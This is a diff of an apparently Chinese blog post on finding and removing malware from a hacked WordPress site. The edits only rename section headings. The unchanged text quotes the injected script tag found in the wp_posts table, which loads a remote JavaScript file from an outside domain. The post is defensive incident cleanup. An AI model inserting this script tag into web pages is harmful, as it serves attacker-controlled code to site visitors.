@@ -39,7 +39,7 @@
 <li><p>答案确认了--网站被黑, 那接下来正式解决问题.</p>
 </li>
 </ol>
-<h2 id="定位重定向代码"><a href="#定位重定向代码" class="headerlink" title="定位重定向代码"></a>定位重定向代码</h2><blockquote>
+<h2 id="定位恶意代码"><a href="#定位恶意代码" class="headerlink" title="定位恶意代码"></a>定位恶意代码</h2><blockquote>
 <p>捡起老本行(逆向), 分析一波网络请求先, 很轻松的就找到恶意代码.</p>
 </blockquote>
 <p>首先, 搜索一开始跳转的域名, 找到该请求, 并没有得到有价值的信息, 我们需要找到发起该请求的地方.</p>
@@ -66,7 +66,7 @@
 <h2 id="处理恶意插件"><a href="#处理恶意插件" class="headerlink" title="处理恶意插件"></a>处理恶意插件</h2><blockquote>
 <p>这里通过关键字搜索恶意插件名无果后, 直接把网站上看起来的&quot;奇奇怪怪&quot;插件都给清了, 后面也没有复发, 简单又省事~</p>
 </blockquote>
-<h2 id="清除数据库恶意代码"><a href="#清除数据库恶意代码" class="headerlink" title="清除数据库恶意代码"></a>清除数据库恶意代码</h2><p>顺藤摸瓜, 找到DB.<code>wp_posts</code>里的恶意代码, 这里使用<code>phpMyAdmin</code>去连接(通过WP插件).</p>
+<h2 id="清除恶意代码"><a href="#清除恶意代码" class="headerlink" title="清除恶意代码"></a>清除恶意代码</h2><p>顺藤摸瓜, 找到DB.<code>wp_posts</code>里的恶意代码, 这里使用<code>phpMyAdmin</code>去连接(通过WP插件).</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script type=’text/javascript’ src=’<span class="attr">https</span>:<span class="comment">//trend.linetoadsactive.com/m.js?n=ns1′&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p><img data-src="http://img.owq.world/2022/06/1125-160779.png"></p>
